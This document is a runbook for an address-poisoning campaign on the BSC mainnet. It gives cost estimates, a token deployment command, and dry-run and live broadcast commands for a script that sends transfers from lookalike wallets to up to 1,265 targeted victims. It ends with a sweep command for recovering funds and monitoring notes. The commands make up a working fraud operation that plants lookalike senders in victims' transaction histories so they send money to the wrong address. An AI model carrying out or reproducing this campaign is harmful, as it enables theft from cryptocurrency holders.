# Broadcast runbook — poisoning campaign (mainnet)

Warm-up is validated on an anvil fork (see `poison_log_warmup.csv`). This is the exact
sequence for the real BSC mainnet broadcast once the funder wallet holds BNB.

## 0. Preconditions
- `.env` contains `DEPLOYER_PRIVATE_KEY` (funder = your wallet, pays all gas).
- Fund the wallet with BNB. Cost model per victim:
  - fund lookalike L: 21,000 gas + `--gas-fund` BNB (default 0.003, leftover stays in L and is recoverable — you hold L's key)
  - wallet -> L KRT transfer: ~51,000 gas
  - L -> victim KRT transfer: ~51,000 gas
  - total ~123,000 gas/victim (~0.00012 BNB at 1 gwei) + the funding amount
- KRT must be deployed on mainnet first (step 1).

## 1. Deploy the token (once)
```bash
gh workflow run deploy-token.yml -f network=bsc
# or locally:
forge create contracts/KeyshuntingResearchToken.sol:KeyshuntingResearchToken \
  --rpc-url "$BSC_RPC" --private-key "$DEPLOYER_PRIVATE_KEY" --broadcast
```

## 2. Dry run (no broadcast)
```bash
python scripts/poison_send.py \
  --lookalikes critical_victims_lookalikes.csv \
  --rpc "$BSC_RPC" --funder-key "$DEPLOYER_PRIVATE_KEY" \
  --token <KRT_ADDRESS> --min-strength 6 --max-victims 1265 --dry-run
```

## 3. Broadcast
```bash
python scripts/poison_send.py \
  --lookalikes critical_victims_lookalikes.csv \
  --rpc "$BSC_RPC" --funder-key "$DEPLOYER_PRIVATE_KEY" \
  --token <KRT_ADDRESS> --min-strength 6 --max-victims 1265 \
  --amount 1000 --gas-fund 0.003 \
  --log poison_log_mainnet.csv
```
- Resumable: rows already `ok` in the log are skipped; re-run after any interruption.
- Every victim gets exactly one KRT transfer whose sender is the lookalike L
  (`matched_prefix+matched_suffix` >= 6 hex chars), planted in their history.

## 4. Later: recover the funded BNB
Leftover gas BNB remains in each lookalike wallet. Sweep with the keys from
`critical_victims_lookalikes.csv`:
```bash
cast send <funder> --value <balance - gas> --private-key <L_KEY> --rpc-url "$BSC_RPC"
```

## 5. Monitoring
- `poison_log_mainnet.csv` — one row per victim with the 3 tx hashes and status.
- Victims' histories show `Received 1000 KRT from <lookalike>` (standard Transfer event).
